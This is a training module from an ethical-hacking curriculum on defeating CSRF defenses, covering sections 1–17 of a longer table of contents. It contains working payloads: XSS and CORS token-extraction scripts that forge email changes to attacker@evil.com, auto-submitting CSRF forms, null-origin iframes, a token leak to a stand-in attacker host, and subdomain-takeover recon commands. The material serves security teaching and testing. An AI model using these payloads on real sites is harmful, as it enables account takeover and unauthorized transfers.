# CSRF Module 07 — Defeating the Defenses
> **Curriculum:** CSRF Mastery for Ethical Hacking & Bug Bounty  
> **Module:** 07 of 12  
> **Topic:** Token Extraction, Referer Leakage, Subdomain Attacks, Origin Bypass, Double-Submit Bypass, Method Switching  
> **Level:** Advanced — systematic bypass techniques for every major CSRF defense

---

## Table of Contents
- [CSRF Module 07 — Defeating the Defenses](#csrf-module-07--defeating-the-defenses)
  - [Table of Contents](#table-of-contents)
  - [1. The Bypass Framework — Trust Assumption Analysis](#1-the-bypass-framework--trust-assumption-analysis)
  - [2. Bypass 1 — CSRF Token Extraction via Same-Origin XSS](#2-bypass-1--csrf-token-extraction-via-same-origin-xss)
    - [Token Extraction Methods](#token-extraction-methods)
    - [Complete XSS + CSRF Payload](#complete-xss--csrf-payload)
    - [Why This Works](#why-this-works)
  - [3. Bypass 2 — CSRF Token Extraction via Cross-Subdomain XSS](#3-bypass-2--csrf-token-extraction-via-cross-subdomain-xss)
    - [What Cross-Subdomain XSS CAN and CANNOT Do](#what-cross-subdomain-xss-can-and-cannot-do)
    - [What Additional Primitive Is Needed](#what-additional-primitive-is-needed)
  - [4. Bypass 3 — Token Leakage via Referer Header](#4-bypass-3--token-leakage-via-referer-header)
    - [How Token Gets Into URLs](#how-token-gets-into-urls)
    - [The Leakage Mechanism](#the-leakage-mechanism)
    - [Testing for Token in URL](#testing-for-token-in-url)
    - [Exploitation Requirements](#exploitation-requirements)
  - [5. Bypass 4 — Token Leakage via CORS Misconfiguration](#5-bypass-4--token-leakage-via-cors-misconfiguration)
    - [Dangerous CORS Configuration](#dangerous-cors-configuration)
    - [Attack Flow](#attack-flow)
    - [Why ACAO: \* Does Not Enable This](#why-acao--does-not-enable-this)
  - [6. Bypass 5 — SameSite Bypass via Subdomain Takeover](#6-bypass-5--samesite-bypass-via-subdomain-takeover)
    - [Why Subdomains Are Same-Site](#why-subdomains-are-same-site)
    - [Full Subdomain Takeover Attack Chain](#full-subdomain-takeover-attack-chain)
    - [Vulnerable CNAME Targets (Common Platforms)](#vulnerable-cname-targets-common-platforms)
  - [7. Bypass 6 — Origin Validation Weaknesses](#7-bypass-6--origin-validation-weaknesses)
    - [Weakness 1 — Substring and Suffix Matching](#weakness-1--substring-and-suffix-matching)
    - [Weakness 2 — Null Origin](#weakness-2--null-origin)
    - [Weakness 3 — Absent Origin Allowed](#weakness-3--absent-origin-allowed)
    - [Weakness 4 — Subdomain Wildcard Trust](#weakness-4--subdomain-wildcard-trust)
  - [8. Bypass 7 — Referer Suppression](#8-bypass-7--referer-suppression)
    - [Why Attacker Cannot Set Referer to Victim Domain](#why-attacker-cannot-set-referer-to-victim-domain)
  - [9. Bypass 8 — Double-Submit Cookie Subdomain Injection](#9-bypass-8--double-submit-cookie-subdomain-injection)
  - [10. Bypass 9 — Token Fixation](#10-bypass-9--token-fixation)
    - [Scenario 1 — Predictable Token](#scenario-1--predictable-token)
    - [Scenario 2 — Token Settable via URL](#scenario-2--token-settable-via-url)
    - [Scenario 3 — Token Shared Across Sessions](#scenario-3--token-shared-across-sessions)
  - [11. Bypass 10 — Method and Content-Type Switching](#11-bypass-10--method-and-content-type-switching)
    - [Method Switching Tests](#method-switching-tests)
    - [Content-Type Switching Tests](#content-type-switching-tests)
  - [12. Bypass 11 — text/plain CSRF on JSON Endpoints](#12-bypass-11--textplain-csrf-on-json-endpoints)
    - [The Vulnerability](#the-vulnerability)
    - [Why This Is Exploitable](#why-this-is-exploitable)
    - [The PoC](#the-poc)
    - [JSON Injection Variants](#json-injection-variants)
  - [13. Bypass 12 — Null Origin Attack](#13-bypass-12--null-origin-attack)
  - [14. Chaining Multiple Bypasses — Attack Composition](#14-chaining-multiple-bypasses--attack-composition)
    - [Example Chain: Subdomain XSS + Token Leakage + Origin Bypass](#example-chain-subdomain-xss--token-leakage--origin-bypass)
    - [Chain Dependency Analysis](#chain-dependency-analysis)
  - [15. Subdomain Takeover — Reconnaissance and Exploitation](#15-subdomain-takeover--reconnaissance-and-exploitation)
    - [Reconnaissance Pipeline](#reconnaissance-pipeline)
    - [Common Takeover Signatures](#common-takeover-signatures)
  - [16. What Each Bypass Does and Does Not Defeat](#16-what-each-bypass-does-and-does-not-defeat)
  - [17. Detection Methodology — Bypass Testing Checklist](#17-detection-methodology--bypass-testing-checklist)
  - [18. Key Terminology Reference](#18-key-terminology-reference)
  - [19. Common Misconceptions](#19-common-misconceptions)
    - [❌ "Subdomain takeover bypasses CSRF tokens"](#-subdomain-takeover-bypasses-csrf-tokens)
    - [❌ "Cross-subdomain XSS defeats all CSRF defenses"](#-cross-subdomain-xss-defeats-all-csrf-defenses)
    - [❌ "Origin: null is always safe to block"](#-origin-null-is-always-safe-to-block)
    - [❌ "text/plain requests can't carry JSON"](#-textplain-requests-cant-carry-json)
    - [❌ "Method override is a niche legacy feature"](#-method-override-is-a-niche-legacy-feature)
    - [❌ "CORS wildcard (ACAO: \*) enables CSRF"](#-cors-wildcard-acao--enables-csrf)
  - [20. Bug Bounty Reference](#20-bug-bounty-reference)
    - [High-Value Bypass Chains to Look For](#high-value-bypass-chains-to-look-for)
    - [Severity Amplifiers](#severity-amplifiers)
  - [21. Module 7 Summary — What You Must Know Cold](#21-module-7-summary--what-you-must-know-cold)

---

## 1. The Bypass Framework — Trust Assumption Analysis

Every CSRF defense is a trust assertion. Every bypass exploits a gap in that assertion.

```
┌──────────────────┬──────────────────────────────┬────────────────────────────┐
│ Defense          │ Trust Assumption              │ Bypass Vector              │
├──────────────────┼──────────────────────────────┼────────────────────────────┤
│ CSRF Token       │ Attacker cannot read the      │ Same-origin XSS extraction │
│                  │ token from the page           │ Referer leakage via URL    │
│                  │                               │ CORS misconfig read        │
│                  │                               │ Token fixation             │
│                  │                               │ Predictable generation     │
├──────────────────┼──────────────────────────────┼────────────────────────────┤
│ SameSite=Lax     │ Attacker cannot trigger       │ Subdomain XSS (same-site)  │
│                  │ same-site requests            │ Subdomain takeover         │
│                  │                               │ GET state-change endpoints │
│                  │                               │ Lax+POST timing window     │
├──────────────────┼──────────────────────────────┼────────────────────────────┤
│ SameSite=Strict  │ No cross-site request carries │ Subdomain XSS (same-site)  │
│                  │ the session cookie            │ Subdomain takeover         │
│                  │                               │ (strict ≠ same-origin)     │
├──────────────────┼──────────────────────────────┼────────────────────────────┤
│ Origin Header    │ Browser sets Origin correctly │ Absent header (old browser)│
│                  │ Server checks allowlist       │ Null origin (sandboxed)    │
│                  │ precisely                     │ Substring/suffix matching  │
│                  │                               │ Subdomain trust            │
├──────────────────┼──────────────────────────────┼────────────────────────────┤
│ Referer Header   │ Referer reflects true source  │ Suppression (meta policy)  │
│                  │                               │ HTTPS→HTTP strip           │
│                  │                               │ Absent header allowed      │
├──────────────────┼──────────────────────────────┼────────────────────────────┤
│ Double-Submit    │ Attacker cannot control       │ Subdomain cookie injection  │
│ Cookie           │ the cookie value              │ (requires subdomain access) │
└──────────────────┴──────────────────────────────┴────────────────────────────┘
```

---

## 2. Bypass 1 — CSRF Token Extraction via Same-Origin XSS

XSS on the exact same origin as the target completely defeats CSRF tokens.

### Token Extraction Methods

```javascript
// METHOD 1: Read from hidden form field
const token = document.querySelector('[name="csrf_token"]').value;

// METHOD 2: Read from meta tag
const token = document.querySelector('meta[name="csrf-token"]').content;

// METHOD 3: Read from cookie (if not HttpOnly)
const token = document.cookie.match(/csrf[^=]+=([^;]+)/)[1];

// METHOD 4: Fetch a page and extract from HTML
const resp = await fetch('/settings', { credentials: 'include' });
const html = await resp.text();
const token = html.match(/name="csrf_token"\s+value="([^"]+)"/)[1];

// METHOD 5: Fetch JSON endpoint that returns token
const resp = await fetch('/api/csrf-token', { credentials: 'include' });
const data = await resp.json();
const token = data.token;
```

### Complete XSS + CSRF Payload

```javascript
// Full payload: extract token then forge request
(async () => {
  // Step 1: Get a page containing the CSRF token
  const resp = await fetch('/settings', { credentials: 'include' });
  const html = await resp.text();

  // Step 2: Extract token
  const token = html.match(/csrf_token[^>]+value="([^"]+)"/)?.[1];
  if (!token) return;

  // Step 3: Forge authenticated request with valid token
  await fetch('/settings/change-email', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: `email=attacker@evil.com&csrf_token=${encodeURIComponent(token)}`
  });
})();
```

### Why This Works

```
XSS runs on app.victim.com (same-origin):
  ✓ Can read any DOM element on app.victim.com pages
  ✓ Can fetch any app.victim.com URL and read response (same-origin)
  ✓ All requests to app.victim.com are same-site → SameSite bypassed
  ✓ Origin: app.victim.com → passes Origin check
  ✓ Referer: app.victim.com → passes Referer check
  ✓ Session cookie sent automatically (same-origin, no SameSite restriction)
```

---

## 3. Bypass 2 — CSRF Token Extraction via Cross-Subdomain XSS

XSS on a subdomain (`other.victim.com`) targeting the main app (`app.victim.com`).

### What Cross-Subdomain XSS CAN and CANNOT Do

```
CAN:
  ✓ Send credentialed requests to app.victim.com
    → Both are victim.com (same-site) → SameSite cookies sent
  ✓ Bypass SameSite=Lax and SameSite=Strict (same-site requests)
  ✓ Pass Origin checks if subdomain is trusted/in allowlist
  ✓ Pass Referer checks (Referer shows victim.com subdomain)
  ✓ Set cookies for .victim.com domain (cookie injection)

CANNOT:
  ✗ Read responses from app.victim.com
    → Cross-origin (different subdomain = different origin)
    → SOP blocks response reads
  ✗ Read CSRF token from app.victim.com's HTML directly
  ✗ Access app.victim.com's DOM

CONCLUSION:
  Cross-subdomain XSS defeats SameSite, Origin, Referer
  Cross-subdomain XSS does NOT defeat CSRF tokens alone
  Requires a separate token leakage vector to achieve full bypass
```

### What Additional Primitive Is Needed

```
To complete bypass from cross-subdomain XSS, need ONE of:
  A) Token in URL → Referer leakage to controlled resource
  B) CORS misconfiguration on app.victim.com allowing subdomain reads
  C) Token leaked in error messages, logs, or API responses
  D) Double-submit pattern (can be defeated via cookie injection from subdomain)
  E) No CSRF token at all (SameSite bypass is sufficient)
```

---

## 4. Bypass 3 — Token Leakage via Referer Header

When a CSRF token appears in a URL, it leaks to any third-party resource loaded on that page.

### How Token Gets Into URLs

```
Common sources of CSRF token in URLs:
  1. Token in password reset / confirmation email links
     https://victim.com/reset?token=abc&csrf=xK9mP2...

  2. Token in pagination or filter URLs
     https://victim.com/posts?page=2&csrf=xK9mP2...

  3. Token in redirect URLs after form submission
     302 Location: /success?csrf=xK9mP2...

  4. Token in form action attribute
     <form action="/submit?csrf=xK9mP2...">

  5. Developer error — token added to GET parameters
```

### The Leakage Mechanism

```
Page URL: https://victim.com/reset?token=abc&csrf=xK9mP2qL...

Page loads any cross-origin resource:
  <script src="https://analytics.attacker.com/track.js">
  <img src="https://cdn.attacker.com/pixel.gif">
  <link href="https://fonts.external.com/font.css">

Browser sends to external server:
  GET /track.js HTTP/1.1
  Host: analytics.attacker.com
  Referer: https://victim.com/reset?token=abc&csrf=xK9mP2qL...
  ↑ full URL including CSRF token sent to third-party

Attacker reads token from:
  → Server logs of attacker-controlled resource
  → Analytics dashboard
  → CDN access logs
  → Any server receiving the Referer header
```

### Testing for Token in URL

```
During testing, search for CSRF token value in:
  □ URL query parameters of any page
  □ Link href attributes in page source
  □ Form action attributes
  □ Redirect Location headers (intercept responses)
  □ Email links (test password reset, confirmation flows)
  □ Error page URLs
  □ Browser history / bookmarks during testing session
```

### Exploitation Requirements

```
For Referer leakage to be exploitable:
  1. Token must appear in a URL
  2. Page must load a cross-origin resource the attacker can read logs from
  3. Token must be stable enough to use after leakage
     (per-session token: valid for session lifetime ← most dangerous)
     (per-request token: may have rotated by time of use)
```

---

## 5. Bypass 4 — Token Leakage via CORS Misconfiguration

Permissive CORS allows attacker to read cross-origin responses containing CSRF tokens.

### Dangerous CORS Configuration

```
Response headers:
  Access-Control-Allow-Origin: https://attacker.com   ← specific origin
  Access-Control-Allow-Credentials: true               ← allows cookies

OR:
  Access-Control-Allow-Origin: [reflects Origin header blindly]
  Access-Control-Allow-Credentials: true
```

### Attack Flow

```javascript
// Attacker's page on attacker.com

// Step 1: Read victim's settings page (CORS allows this)
const resp = await fetch('https://app.victim.com/settings', {
  credentials: 'include'    // sends victim's session cookie
});

// Step 2: CORS policy allows attacker.com to read response
const html = await resp.text();

// Step 3: Extract CSRF token
const token = html.match(/csrf_token[^>]+value="([^"]+)"/)[1];

// Step 4: Forge authenticated request with token
await fetch('https://app.victim.com/settings/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: `email=attacker@evil.com&csrf_token=${token}`
});

// All defenses bypassed:
// CSRF token: extracted via CORS-enabled response read
// SameSite: N/A — CORS allows cross-origin credentialed requests
// Origin: attacker.com explicitly allowed in CORS policy
```

### Why ACAO: * Does Not Enable This

```
Access-Control-Allow-Origin: *
+ credentials: 'include'
= BROWSER BLOCKS THIS COMBINATION

Wildcard ACAO cannot be used with credentials
Browser enforces: "Cannot use wildcard in ACAO when credentials flag is true"

For credentialed CORS CSRF, need:
  Access-Control-Allow-Origin: [specific attacker origin]
  Access-Control-Allow-Credentials: true
```

---

## 6. Bypass 5 — SameSite Bypass via Subdomain Takeover

Even `SameSite=Strict` does not protect against attacks from a compromised subdomain.

### Why Subdomains Are Same-Site

```
Same-site boundary = registrable domain (eTLD+1)

app.victim.com    → eTLD+1: victim.com
dev.victim.com    → eTLD+1: victim.com
old.victim.com    → eTLD+1: victim.com

All three are SAME-SITE with each other.
Requests between them carry SameSite=Strict/Lax cookies.
SameSite provides ZERO protection for subdomain-originated attacks.
```

### Full Subdomain Takeover Attack Chain

```
STEP 1: Enumerate subdomains
  subfinder -d victim.com | dnsx -cname

STEP 2: Find dangling CNAME
  old.victim.com CNAME → deleted-bucket.s3.amazonaws.com
  dev.victim.com CNAME → deprovisioned.azurewebsites.net
  staging.victim.com CNAME → unclaimed.netlify.app

STEP 3: Claim the unclaimed resource
  Register the S3 bucket under attacker's AWS account
  Register the Azure/Netlify/Heroku app under attacker's account
  Attacker now controls old.victim.com

STEP 4: Deploy CSRF payload on old.victim.com
  Attacker serves attack page at old.victim.com/attack.html

STEP 5: Forge credentialed requests
  fetch("https://app.victim.com/transfer", {
    method: "POST",
    credentials: "include",
    body: "to=attacker&amount=10000&csrf_token=???"
  });

  Session cookie: sent (same-site)
  SameSite=Strict: bypassed (same-site request)
  SameSite=Lax:    bypassed (same-site request)
  CSRF token:      still required (separate bypass needed)

STEP 6: Token bypass
  Option A: Cookie injection from old.victim.com (defeats double-submit)
  Option B: Referer leakage of per-session token
  Option C: No CSRF token on target endpoint
  Option D: Subdomain has CORS read access to main app
```

### Vulnerable CNAME Targets (Common Platforms)

```
Platform                    Error Signature
────────────────────────────────────────────────────────
AWS S3                      "NoSuchBucket"
GitHub Pages                "There isn't a GitHub Pages site here"
Heroku                      "No such app"
Netlify                     "Not Found - Request ID"
Azure Web Apps              "404 Web Site not found"
Fastly                      "Fastly error: unknown domain"
Shopify                     "Sorry, this shop is currently unavailable"
Tumblr                      "There's nothing here"
Ghost                       "The thing you were looking for is no longer here"
Cargo                       "404 Not Found"
```

---

## 7. Bypass 6 — Origin Validation Weaknesses

### Weakness 1 — Substring and Suffix Matching

```python
# VULNERABLE PATTERNS:

# Suffix match — bypassed by subdomain takeover
if origin.endswith(".victim.com"):
    return True
# Attack: evil.victim.com (taken over) satisfies this

# Substring match — bypassed by crafted domain
if "victim.com" in origin:
    return True
# Attack: register victim.com.attacker.com
#         or evil-victim.com.attacker.com

# Prefix match — bypassed by crafted subdomain
if origin.startswith("https://victim"):
    return True
# Attack: https://victim.attacker.com

# SECURE: exact allowlist match only
ALLOWED_ORIGINS = {
    "https://app.victim.com",
    "https://www.victim.com",
    "https://victim.com"
}
if origin not in ALLOWED_ORIGINS:
    return 403
```

### Weakness 2 — Null Origin

```
Origin: null is sent by:
  → Sandboxed iframes (sandbox attribute)
  → file:// protocol pages
  → data: URLs
  → Some redirect chains

If server allowlists null:
  Access-Control-Allow-Origin: null  → attacker exploits

Attack using sandboxed iframe:
```

```html
<!-- Attacker's page — sends Origin: null -->
<iframe sandbox="allow-scripts allow-forms"
        srcdoc="
  <form action='https://app.victim.com/transfer' method='POST'>
    <input type='hidden' name='to' value='attacker'>
    <input type='hidden' name='amount' value='5000'>
  </form>
  <script>document.forms[0].submit();</script>
"></iframe>

<!-- Request sent with Origin: null
     If server allows null → CSRF succeeds -->
```

### Weakness 3 — Absent Origin Allowed

```
Some legitimate requests don't include Origin:
  GET navigation requests
  Requests from non-browser clients
  Some older browsers

If server allows absent Origin (Origin header not present):
  Attacker suppresses Origin or uses GET vector
  → No Origin check occurs
  → Falls through to allow

Bypass: Use request type that doesn't send Origin
  <meta http-equiv="refresh"> (may not send Origin)
  Older browser environment
```

### Weakness 4 — Subdomain Wildcard Trust

```python
# VULNERABLE: trusts all subdomains
if origin == "https://victim.com" or origin.endswith(".victim.com"):
    return True

# Any compromised subdomain satisfies this:
#   old.victim.com (taken over)      → passes
#   feedback.victim.com (has XSS)    → passes
#   staging.victim.com (less secure) → passes
#   dev.victim.com (abandoned)       → passes
```

---

## 8. Bypass 7 — Referer Suppression

Attacker suppresses Referer to bypass Referer validation when server allows absent Referer.

```html
<!-- Method 1: Meta referrer policy on attacker's page -->
<!DOCTYPE html>
<html>
<head>
  <meta name="referrer" content="no-referrer">
</head>
<body onload="document.forms[0].submit()">
  <form action="https://app.victim.com/transfer"
        method="POST"
        style="display:none">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="5000">
  </form>
</body>
</html>
<!-- No Referer sent → if server allows absent Referer → CSRF succeeds -->

<!-- Method 2: referrerpolicy on form element -->
<form action="https://app.victim.com/transfer"
      method="POST"
      referrerpolicy="no-referrer">

<!-- Method 3: referrerpolicy on link -->
<a href="https://app.victim.com/delete?id=42"
   referrerpolicy="no-referrer">Click here</a>
```

### Why Attacker Cannot Set Referer to Victim Domain

```
Referer header is browser-controlled:
  JavaScript CANNOT set Referer via fetch() or XHR
  Browsers enforce this restriction
  Attacker cannot forge Referer: https://victim.com from evil.com

The only options:
  1. Suppress Referer entirely (no-referrer policy)
  2. Have legitimate victim.com origin (XSS or subdomain takeover)
  3. Find a redirect chain that strips or changes the Referer
```

---

## 9. Bypass 8 — Double-Submit Cookie Subdomain Injection

Full attack against double-submit cookie pattern via subdomain cookie injection.

```
PREREQUISITE:
  Attacker controls any subdomain of victim.com
  (via takeover, XSS, or legitimate subdomain access)

STEP 1: Set cookie from attacker-controlled subdomain
  From old.victim.com (attacker controlled):

  // Via JavaScript on old.victim.com:
  document.cookie = "csrf=ATTACKER_VALUE; domain=.victim.com; path=/";

  // OR via HTTP response header from old.victim.com:
  Set-Cookie: csrf=ATTACKER_VALUE; Domain=victim.com; Path=/; SameSite=None

STEP 2: Cookie is now set for all of victim.com
  Browser's cookie jar for victim.com:
    session=abc123 (set by app.victim.com — attacker cannot overwrite HttpOnly)
    csrf=ATTACKER_VALUE (set by old.victim.com — attacker set this)

STEP 3: Forge request with matching body value
  <form action="https://app.victim.com/transfer" method="POST">
    <input type="hidden" name="amount" value="5000">
    <input type="hidden" name="csrf_token" value="ATTACKER_VALUE">
  </form>

STEP 4: Server validates double-submit
  cookie value:  ATTACKER_VALUE  ← auto-sent by browser
  body value:    ATTACKER_VALUE  ← attacker set this
  ✓ Match → accepted → CSRF succeeds

WHY SIGNED DOUBLE-SUBMIT DEFEATS THIS:
  Attacker injects: csrf=EVIL.FAKE_HMAC
  Server validates HMAC: hmac(SECRET, EVIL) ≠ FAKE_HMAC → REJECTED
  Attacker cannot forge valid HMAC without server's SECRET_KEY
```

---

## 10. Bypass 9 — Token Fixation

Attacker sets or predicts the CSRF token before the victim uses it.

### Scenario 1 — Predictable Token

```python
# VULNERABLE token generation:
token = md5(username + str(int(time.time())))
token = base64.b64encode(f"{user_id}:{session_id}".encode())
token = hashlib.sha1(email.encode() + b"secretsalt").hexdigest()

# Attack:
# Attacker knows username (public profile)
# Attacker approximates timestamp (within a few seconds)
# Attacker brute-forces or calculates expected token
# Uses calculated token in forged request
```

### Scenario 2 — Token Settable via URL

```
Vulnerable endpoint: GET /set-csrf?token=ATTACKER_VALUE
Effect: session["csrf_token"] = request.GET["token"]

Attack chain:
  1. Attacker sends victim link:
     https://app.victim.com/set-csrf?token=KNOWN_VALUE
  2. Victim clicks — session CSRF token set to KNOWN_VALUE
  3. Attacker forges request:
     POST /transfer csrf_token=KNOWN_VALUE
  4. Server: KNOWN_VALUE == KNOWN_VALUE → accepted
```

### Scenario 3 — Token Shared Across Sessions

```
VULNERABLE: global token not per-session
  GLOBAL_CSRF = generate_once()  # application startup

  All users receive same token
  Attacker logs in → sees token GLOBAL_VALUE
  Attacker uses GLOBAL_VALUE against victim's session
  → Server accepts (global token matches)
```

---

## 11. Bypass 10 — Method and Content-Type Switching

Testing when CSRF validation is only applied to specific methods or content types.

### Method Switching Tests

```
Test 1: Convert POST to GET
  POST /transfer?to=attacker&amount=5000
  ↓
  GET /transfer?to=attacker&amount=5000
  No CSRF token in GET → if accepted: GET route unprotected

Test 2: Method override via header
  POST /transfer + X-HTTP-Method-Override: GET
  Server treats as GET → CSRF validation for GET may be absent

Test 3: Method override via parameter
  POST /transfer?_method=GET
  POST /transfer + body: _method=GET
  If server honors _method: CSRF validation bypassed

Test 4: HEAD instead of GET/POST
  HEAD /transfer?to=attacker
  Some frameworks execute the action for HEAD (poor implementation)
```

### Content-Type Switching Tests

```
Test 1: application/x-www-form-urlencoded → text/plain
  Some CSRF validators only run on specific content types:
  if request.content_type == "application/x-www-form-urlencoded":
      validate_csrf()  # skipped for text/plain

Test 2: application/x-www-form-urlencoded → application/json
  Requires CORS preflight
  If CORS misconfigured: preflight passes → no CSRF token needed

Test 3: Multipart boundary manipulation
  enctype="multipart/form-data" is a simple request type
  Tests if CSRF validation handles multipart differently
```

---

## 12. Bypass 11 — text/plain CSRF on JSON Endpoints

When a server ignores CSRF validation for `text/plain` but processes the body as JSON.

### The Vulnerability

```
Server logic:
  if Content-Type == "application/json":
      validate_csrf_token()
      parse_json_body()
  elif Content-Type == "text/plain":
      parse_json_body()  # ← processes JSON anyway, skips CSRF check
```

### Why This Is Exploitable

```
HTML forms with enctype="text/plain" are SIMPLE REQUESTS:
  → No CORS preflight
  → Browser sends with session cookies
  → Content-Type: text/plain (skips CSRF validation)
  → Server parses body as JSON (processes the action)
```

### The PoC

```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
  <form action="https://app.victim.com/api/transfer"
        method="POST"
        enctype="text/plain"
        style="display:none">
    <!--
    text/plain encoding: name=value (literal, no URL encoding)
    We craft name so that name=value produces valid JSON:

    Resulting body:
    {"to":"attacker","amount":"5000","x":"="}

    The "x":"=" is an extra ignored field — most JSON parsers accept it
    -->
    <input type="hidden"
           name='{"to":"attacker","amount":"5000","x":"'
           value='"}'>
  </form>
</body>
</html>

<!--
Body sent to server:
{"to":"attacker","amount":"5000","x":"="}

Server receives Content-Type: text/plain
Skips CSRF validation
Parses body as JSON
Executes transfer
-->
```

### JSON Injection Variants

```html
<!-- Variant 1: Single field with full JSON -->
<input name='{"action":"delete","target":"victim_account","z":"'
       value='"}'>
<!-- Body: {"action":"delete","target":"victim_account","z":"="} -->

<!-- Variant 2: Array value -->
<input name='{"ids":[1,2,3],"z":"'
       value='"}'>
<!-- Body: {"ids":[1,2,3],"z":"="} -->

<!-- Variant 3: If server uses first-value-wins parsing -->
<input name='{"to":"attacker"' value='}'>
<!-- Body: {"to":"attacker"=} — may work with loose parsers -->
```

---

## 13. Bypass 12 — Null Origin Attack

Exploiting servers that allowlist `Origin: null`.

```html
<!-- Attack using sandboxed iframe -->
<!-- Sandboxed iframes send Origin: null -->

<iframe
  sandbox="allow-scripts allow-forms"
  srcdoc="
    <!DOCTYPE html>
    <html>
    <body onload='document.forms[0].submit()'>
      <form action='https://app.victim.com/transfer'
            method='POST'
            style='display:none'>
        <input type='hidden' name='to' value='attacker'>
        <input type='hidden' name='amount' value='5000'>
        <input type='hidden' name='csrf_token' value='KNOWN_TOKEN'>
      </form>
    </body>
    </html>
  "
  style="display:none">
</iframe>

<!--
Request headers:
  Origin: null          ← sandboxed iframe always sends this
  Cookie: session=abc   ← if SameSite allows

If server has:
  if origin == "null" or origin is None: allow
→ CSRF succeeds
-->
```

---

## 14. Chaining Multiple Bypasses — Attack Composition

Real-world CSRF bypasses often require chaining multiple primitives.

### Example Chain: Subdomain XSS + Token Leakage + Origin Bypass

```
FINDINGS:
  F1: Stored XSS on feedback.victim.com
  F2: Per-session CSRF token (stable)
  F3: CSRF token appears in URL of confirmation page
  F4: Origin validation uses .endswith(".victim.com") (weak suffix check)

CHAIN:

Step 1 — Token Acquisition (F3 — Referer Leakage)
  Victim clicks confirmation link:
    https://victim.com/confirm?action=X&csrf=xK9mP2qL...
  Page loads: <img src="https://resources.attacker.com/pixel.gif">
  Attacker's server receives:
    Referer: https://victim.com/confirm?action=X&csrf=xK9mP2qL...
  Token obtained: xK9mP2qL...

Step 2 — Request Execution (F1 + F4)
  XSS payload stored on feedback.victim.com executes:
    fetch("https://app.victim.com/account/change-email", {
      method: "POST",
      credentials: "include",      // same-site → session cookie sent
      body: `email=attacker@evil.com&csrf_token=xK9mP2qL...`
    });

  Server receives:
    Cookie: session=abc123          ← same-site, cookie sent (F1 bypasses SameSite)
    Origin: feedback.victim.com     ← passes .endswith check (F4 bypassed)
    Body: csrf_token=xK9mP2qL...   ← valid token (F3 gave us this)
  
  All defenses bypassed → email changed → ATO chain begins
```

### Chain Dependency Analysis

```
For this chain, all four findings are required:
  Remove F1 (XSS): cannot execute same-site request
  Remove F2 (stable token): token may rotate before use
  Remove F3 (token in URL): cannot obtain token cross-subdomain
  Remove F4 (weak Origin): request rejected at Origin check

Each finding fills a specific gap in the bypass.
One strong defense at any point breaks the chain.
```

---

## 15. Subdomain Takeover — Reconnaissance and Exploitation

### Reconnaissance Pipeline

```bash
# Step 1: Enumerate subdomains
subfinder -d victim.com -o subdomains.txt
amass enum -d victim.com >> subdomains.txt
assetfinder --subs-only victim.com >> subdomains.txt

# Step 2: Resolve and find CNAMEs
cat subdomains.txt | dnsx -cname -o cnames.txt

# Step 3: Check for takeover vulnerability
cat subdomains.txt | nuclei -t takeovers/
subjack -w subdomains.txt -t 100 -o takeovers.txt
```

### Common Takeover Signatures

```
AWS S3:
  CNAME: *.s3.amazonaws.com or *.s3-website-*.amazonaws.com
  Error: "NoSuchBucket" or "The specified bucket does not exist"
  Takeover: Create S3 bucket with same name

GitHub Pages:
  CNAME: *.github.io
  Error: "There isn't a GitHub Pages site here"
  Takeover: Create GitHub Pages repo with matching domain

Heroku:
  CNAME: *.herokudns.com or *.herokuapp.com
  Error: "No such app" or "Heroku | No such app"
  Takeover: Create Heroku app and add custom domain

Netlify:
  CNAME: *.netlify.app or *.netlify.com
  Error: "Not Found - Request ID: ..."
  Takeover: Create Netlify site and add custom domain
```

---

## 16. What Each Bypass Does and Does Not Defeat

```
┌─────────────────────────┬──────────┬──────────┬──────────┬──────────┐
│ Bypass                  │ CSRF Tkn │ SameSite │ Origin   │ Referer  │
├─────────────────────────┼──────────┼──────────┼──────────┼──────────┤
│ Same-origin XSS         │ DEFEATS  │ DEFEATS  │ DEFEATS  │ DEFEATS  │
│ Cross-subdomain XSS     │ partial* │ DEFEATS  │ partial† │ DEFEATS  │
│ Subdomain takeover      │ partial* │ DEFEATS  │ partial† │ DEFEATS  │
│ Referer leakage         │ DEFEATS  │ no       │ no       │ no       │
│ CORS misconfiguration   │ DEFEATS  │ no       │ partial‡ │ no       │
│ Origin suffix bypass    │ no       │ no       │ DEFEATS  │ no       │
│ Null origin             │ no       │ no       │ DEFEATS  │ no       │
│ Referer suppression     │ no       │ no       │ no       │ DEFEATS  │
│ Double-submit injection │ DEFEATS§ │ no       │ no       │ no       │
│ Token fixation          │ DEFEATS  │ no       │ no       │ no       │
│ Method switching        │ DEFEATS  │ no       │ no       │ no       │
│ text/plain CSRF         │ DEFEATS  │ no       │ no       │ no       │
│ Lax+POST timing window  │ no       │ DEFEATS  │ no       │ no       │
│ GET state change        │ no       │ DEFEATS  │ no       │ no       │
└─────────────────────────┴──────────┴──────────┴──────────┴──────────┘

* Defeats CSRF token only if combined with separate token leakage vector
† Defeats Origin check only if subdomain is in allowlist or check is weak
‡ Defeats Origin check only if CORS explicitly allows attacker origin
§ Defeats double-submit only, not synchronizer token pattern
```

---

## 17. Detection Methodology — Bypass Testing Checklist

```
CSRF TOKEN BYPASS TESTS:
  □ Remove token → accepted? (not validated)
  □ Empty token → accepted? (presence not value checked)
  □ Random value → accepted? (not validated against session)
  □ Another user's token → accepted? (not session-bound)
  □ Token in URL? → check Referer leakage to third-party resources
  □ Token predictable? → analyze generation algorithm
  □ Token rotates per-request? → check back button behavior
  □ CORS misconfiguration? → can attacker read response containing token?

SAMESITE BYPASS TESTS:
  □ Subdomains enumerated? → check for takeover opportunities
  □ State-changing GET endpoints? → Lax navigation exception
  □ Cookie has explicit SameSite? → check for Lax+POST timing window
  □ Subdomain with XSS? → same-site request capability

ORIGIN VALIDATION BYPASS TESTS:
  □ Send Origin: https://evil.com → rejected?
  □ Send no Origin header → allowed?
  □ Send Origin: null → allowed? (sandboxed iframe attack)
  □ Check validation logic: substring? suffix? exact match?
  □ Any subdomain in allowlist that could be taken over?

REFERER BYPASS TESTS:
  □ Send request with no Referer → allowed?
  □ Add <meta name="referrer" content="no-referrer"> to PoC
  □ Is Referer the SOLE validation? → suppression bypasses entirely

DOUBLE-SUBMIT BYPASS TESTS:
  □ Is CSRF token in a cookie? → identify double-submit pattern
  □ Any subdomain control? → attempt cookie injection
  □ Is cookie signed? → check if HMAC validation can be bypassed

